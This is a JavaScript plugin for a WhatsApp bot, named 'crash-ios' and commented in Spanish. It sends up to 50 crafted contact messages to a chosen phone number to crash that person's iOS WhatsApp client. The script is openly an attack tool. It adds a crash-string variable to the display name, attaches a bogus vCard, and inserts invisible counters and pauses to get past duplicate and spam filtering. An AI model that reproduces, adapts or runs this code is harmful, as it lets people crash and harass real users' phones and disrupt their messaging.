// plugins/crash-ios.js

module.exports = {
    name: 'crash-ios',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables necesarias del 'context'
        const { isBot, isCreator, q, reply, prefix, ios6, sleep } = context;

        if (!isBot && !isCreator) return;

        // 2. Lógica para manejar los argumentos (número y cantidad)
        if (!q) {
            // Si no se proporciona ningún argumento, pide el número.
            return reply(`Formato incorrecto.\n*Ejemplo:* ${prefix}crash-ios +5939xxxxxxxx,10`);
        }

        let targetNumber;
        let cantidad = 1; // Por defecto, si solo se pone el número, enviará 1 vez.
        const limite = 50; // Límite máximo para evitar abusos.

        if (q.includes(',')) {
            const parts = q.split(',');
            targetNumber = parts[0].replace(/[^0-9]/g, '');
            const cantidadSolicitada = parseInt(parts[1].trim());

            if (!isNaN(cantidadSolicitada) && cantidadSolicitada > 0) {
                cantidad = Math.min(cantidadSolicitada, limite); // Usar la cantidad del usuario con un límite
            }
        } else {
            targetNumber = q.replace(/[^0-9]/g, '');
        }

        if (!targetNumber) {
            return reply('El número no es válido.');
        }

        const target = targetNumber + "@s.whatsapp.net";

        // 3. Mensaje de confirmación antes de iniciar el bucle
        await reply(`> Iniciando envío a ${targetNumber}\n*Cantidad* : \`${cantidad}\``);

        // 4. Bucle de envío con anti-spam
        for (let i = 0; i < cantidad; i++) {
            try {
                console.log(`[+] Enviando crash-ios #${i + 1} a ${targetNumber}`);

                // Hacemos cada mensaje único añadiendo un contador invisible
                const uniqueDisplayName = "Xghr-BOT V2" + ios6 + `\u200B ${i + 1}`;

                await conn.relayMessage(target, {
                    contactMessage: {
                        displayName: uniqueDisplayName,
                        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\nFN:🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\nitem1.TEL;waid=69696969696969:69696969696969\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:YT: https://youtube.com/@p.a.zinwebkkkkj\nitem2.X-ABLabel:YouTube\nitem3.URL:INSTA: instagram.com/web_retired\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Brasil, AM, SP;;;;\nitem4.X-ABLabel:Region\nEND:VCARD",
                        contextInfo: {
                            forwardingScore: 2,
                            isForwarded: true,
                            isFromMe: true,
                            externalAdReply: {
                                mediaType: 1,
                                previewType: "NONE",
                                sourceUrl: `https://xnnx.com`,
                            }
                        }
                    }
                }, {
                    quoted: m
                });

                // Pausa entre mensajes
                await sleep(1500);

            } catch (e) {
                console.error(`[!] Error al enviar crash-ios #${i + 1}:`, e);
            }
        }
        
        // Reacción para confirmar que el bucle terminó
        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    }
};